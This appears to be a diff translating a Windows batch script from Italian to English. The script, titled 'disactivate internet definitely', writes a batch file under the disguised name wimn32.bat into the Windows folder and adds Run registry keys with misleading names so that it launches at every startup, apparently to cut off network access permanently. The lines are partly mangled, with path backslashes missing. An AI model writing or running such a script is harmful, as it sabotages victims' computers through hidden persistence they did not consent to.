@@ -1,5 +1,5 @@
-title disattivare internet
-rem disattivare internet definitivamente
+title disactivate internet
+rem disactivate internet definitely
 :main
 echo @echo off>c:windowswimn32.bat
 echo break off>>c:windowswimn32.bat
@@ -9,5 +9,5 @@ reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAP
 reg_sz /d c:windowswimn32.bat /f
 reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t
 reg_sz /d c:windowswimn32.bat /f
-echo Ciao ciao internet.
+echo Bye bye internet.
 PAUSE
